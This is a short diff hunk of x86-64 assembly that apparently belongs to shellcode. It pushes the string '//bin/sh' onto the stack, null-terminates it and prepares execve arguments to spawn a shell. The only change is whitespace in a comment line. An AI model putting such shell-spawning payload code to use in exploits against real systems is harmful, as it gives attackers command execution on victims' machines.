@@ -57,7 +57,7 @@ jnz dupes
 mov		rax,0x68732f6e69622f2f	; string 'hs/nib//'
 push		rax			; push the string onto the stack
 xor		rax,rax
-mov byte        [rsp + 8],al            ; null-terminate the string
+mov byte        [rsp + 8],al		; null-terminate the string
 mov		rdi,rsp			; arg1 = pointer to string
 push		rax			; arg2 = null
 mov		rsi,rsp
